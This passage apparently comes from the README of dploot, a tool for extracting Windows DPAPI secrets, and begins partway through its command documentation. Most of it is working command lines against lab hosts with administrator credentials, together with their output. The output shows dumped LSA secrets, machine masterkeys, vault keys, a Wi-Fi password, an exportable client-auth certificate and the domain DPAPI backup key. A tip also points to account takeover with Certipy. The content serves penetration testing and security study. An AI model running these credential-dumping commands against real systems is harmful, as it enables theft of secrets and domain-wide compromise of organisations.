{c1027a5b-0dcc-4237-af05-19839a94c12f}:fda0c774f6a8ff189ef2759a151f2c6bcf6a4d46
{e1a73282-709b-4717-ace0-00eecb280fcc}:cdb4c86722b50cecf87cf683c6d727f36d760dba
{6fbe7c89-9810-4ce3-b841-f0f1dd8b46e6}:1fb57eb358ea26c617d39ce04c5feb613ab10b89
{750630e8-b603-4d43-941e-6f756073e511}:f9fd650d02a09e92069c54465455feeea12f0049

[*] Triage SYSTEM Vaults

[*] Found Vault Directory: \\192.168.56.14\C$\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

[VAULT_VPOL_KEYS]
Key1: 0x8a3dad10ce6ae44ba1700d1060cc28c4
Key2: 0x1514dd2c8f278ac517cf1ae09255aeaff62219a019bc21ac35321c040064b0b5
```

### machinecertificates

The **machinecertificates** command will get any machine private key file found and decrypt them with `-mkfile FILE` of one or more {GUID}:SHA1, otherwise dploot willdump DPAPI_SYSTEM LSA secret key. in order to decrypt any machine masterkeys, and then decrypt any found encrypted DPAPI private key blob.

It will also dump machine CAPI certificates blob with RemoteRegistry.

```text
$ dploot machinecertificates waza.local/Administrator:'Password!123'@192.168.57.5
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)
[*] Triage SYSTEM masterkeys

[*] Target system bootKey: 0x7d12d83df2060285163096f110c18535
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
[*] DPAPI_SYSTEM
[*] NL$KM
[*] Found SYSTEM system MasterKey: \\192.168.57.5\C$\Windows\System32\Microsoft\Protect\S-1-5-18\07e6e8d6-7eae-4780-9aac-641818ddd9bb
[*] Found SYSTEM system MasterKey: \\192.168.57.5\C$\Windows\System32\Microsoft\Protect\S-1-5-18\a87bcad8-5ed9-4f09-a9f7-34d77e20d0d4
[*] Found SYSTEM system MasterKey: \\192.168.57.5\C$\Windows\System32\Microsoft\Protect\S-1-5-18\d03a0e3b-b616-4a29-8795-9ca09960de35
[*] Found SYSTEM user MasterKey: \\192.168.57.5\C$\Windows\System32\Microsoft\Protect\S-1-5-18\User\69b3f620-eca1-45c1-a003-f1d0a8598c57
[*] Found SYSTEM user MasterKey: \\192.168.57.5\C$\Windows\System32\Microsoft\Protect\S-1-5-18\User\9a270191-3f43-46d1-9935-5892dca2a9a2
[*] Found SYSTEM user MasterKey: \\192.168.57.5\C$\Windows\System32\Microsoft\Protect\S-1-5-18\User\e85c4ab7-65d3-45df-9abe-829c2ead1c5f
{07e6e8d6-7eae-4780-9aac-641818ddd9bb}:ddb9fa17d4e9ab12[...]
{a87bcad8-5ed9-4f09-a9f7-34d77e20d0d4}:e4661cd36f07bb1f[...]
{d03a0e3b-b616-4a29-8795-9ca09960de35}:a45fdd01699bfbc5[...]
{69b3f620-eca1-45c1-a003-f1d0a8598c57}:2862216b21e96fa6[...]
{9a270191-3f43-46d1-9935-5892dca2a9a2}:d3cb43dd6645d26d[...]
{e85c4ab7-65d3-45df-9abe-829c2ead1c5f}:c2a118094fb7cf85[...]
[*] Found PrivateKey Blob: \\192.168.57.5\C$\ProgramData\Microsoft\Crypto\RSA\MachineKeys\18c2929b45da56e7c90a89c6640aa250_a14e72b0-8859-4206-8d30-211c4f03281b
[*] Found match between 1337972D3978595AF8AFF9FD62864CA9BB956308 certificate and 18c2929b45da56e7c90a89c6640aa250_a14e72b0-8859-4206-8d30-211c4f03281b private key !

Issuer:			CN=waza-SRV01-CA,DC=waza,DC=local
Subject:		CN=DESKTOP-I60R2L6.waza.local
Valid Date:		2022-04-29 09:30:19
Expiry Date:		2023-04-29 09:30:19
Extended Key Usage:
	clientAuth (1.3.6.1.5.5.7.3.2)
	[!] Certificate is used for client auth!
	serverAuth (1.3.6.1.5.5.7.3.1)

-----BEGIN CERTIFICATE-----
MIIFPjCCBCagAwIBAgITZQAAAISBaXZr8y2FGgAAAAAAhDANBgkqhkiG9w0BAQsF
[...]
xRRV6lYfMcgisA8kkOMm6pgBMJNsYqJdMHE9pA86h8/akuRI8POp7FfcS/futKU0
ROw=
-----END CERTIFICATE-----

[*] Writting certificate to 1337972D3978595AF8AFF9FD62864CA9BB956308.pfx
```

***Tips***: *If you get a certificate with client authentication EKU, you can takeover the account with [certipy](https://github.com/ly4k/Certipy).*

#### machinetriage

The machinetriage command runs the [machinecredentials](#machinecredentials), [machinevaults](#machinevaults) and [machinecertificates](#machinecertificates).

### Misc

#### wifi

The **wifi** command will get any wifi xml configuration file file and decrypt them with `-mkfile FILE` of one or more {GUID}:SHA1, otherwise dploot willdump DPAPI_SYSTEM LSA secret key. in order to decrypt any machine masterkeys, and then decrypt any found encrypted DPAPI private key blob.

```text
$ dploot wifi waza.local/Administrator:'Password!123'@192.168.57.5
[*] Connected to 192.168.57.5 as waza.local\Administrator (admin)
[*] Found Wifi connection file: \\192.168.57.5\C$\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\{2E1E83F0-3CA0-4C19-B8B1-CB461E71F500}\{81241E8C-AC1D-43F6-8EB8-E28275D7ED33}.xml
[WIFI]
Name:           WFD_[...]
AuthType:       WPA2PSK
Pass:           StrongWifiPassMyFriend 
```

#### backupkey

The **backupkey** command will retrieve the domaain DPAPI backup key from a domain controller using [MS-LDAD](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc). This key never changes and can decrypt any domain user DPAPI protected secret. Domain Admin privileges are required.

By default, this command will write the domain backup key into a file called key.pvk, but you can change this with `outputfile` flag. It is also possible to dump legacy backup key with `legacy` flag.

```text
$ dploot backupkey waza.local/Administrator:'Password!123'@192.168.57.20
[DOMAIN BACKUPKEY V2]

PVK_FILE_HDR
dwMagic: {2964713758}
dwVersion: {0}
dwKeySpec: {1}
dwEncryptType: {0}
cbEncryptData: {0}
cbPvk: {1172}
PRIVATEKEYBLOB:{1ef1b5b000000000010000000000000000000000940400000702000000a400005253413200080000010001005df0d3876d1a19b74061ca3dc955d51522b8c4e51fc369bf9eb0101e3953852c05346[...]
13846280711a00ab0339225c226f5260d4379bd00a879554ecc3adbf42b44ef93848fa54aa1ac75da63317689787995fa379c0a0e498f7a656a24b74936ec5b191f7d89da8d113c90c515b1d54335b27193391ee6174075c9f79e}

[*] Exporting private key to file key.pvk
```

## Credits

Those projects helped a lot in writting this tool:

- [Impacket](https://github.com/SecureAuthCorp/impacket) by the community
- [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) by [Harmj0y](https://twitter.com/harmj0y)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz/) by [gentilkiwi](https://twitter.com/gentilkiwi)
- [DonPAPI](https://github.com/login-securite/DonPAPI) by [LoginSecurite](https://twitter.com/LoginSecurite)

## TODO

- Implement LOCAL triage (with extracted stuff)
